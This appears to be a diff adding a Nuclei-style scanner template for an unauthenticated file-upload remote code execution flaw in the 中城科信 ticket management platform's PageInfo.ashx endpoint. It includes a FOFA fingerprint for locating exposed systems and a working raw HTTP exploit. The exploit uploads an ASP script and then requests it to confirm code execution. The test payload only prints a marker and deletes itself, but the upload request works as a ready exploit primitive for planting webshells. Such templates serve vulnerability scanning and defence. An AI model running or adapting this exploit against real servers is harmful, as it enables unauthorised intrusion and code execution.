@@ -1,0 +1,36 @@
+id: zhongcheng-ticket-pageinfoashx-file-upload
+
+info:
+  name: "中城科信票务管理平台PageInfo.ashx接口文件上传未授权远程代码执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: "js/System/jquery.ellipsis.min.js" && icon_hash="1632964060"
+      中城科信票务管理平台PageInfo.ashx接口未正确校验文件上传权限，攻击者可通过构造恶意请求上传任意类型文件，导致服务器端任意代码执行。该缺陷允许远程攻击者部署WebShell、植入恶意模块或部署勒索软件，最终实现对目标系统的持久化控制。该漏洞利用无需身份认证即可完成攻击链，建议立即部署上传过滤规则并限制目录执行权限。
+  tags: 中城科信票务管理平台
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /SystemManager/PageInfo.ashx?Method=WxUploadImage&fileName=NTest.asp&showNo=NdayPoc&imageType=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+    <% Response.Write("NdayTest"); set myfso=server.CreateObject("scripting.filesystemobject"); myfso.DeleteFile(Server.MapPath("NTest_1.asp")); %>
+- raw:
+  - |
+    GET /HtmlUploadImage/NTest_1.asp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
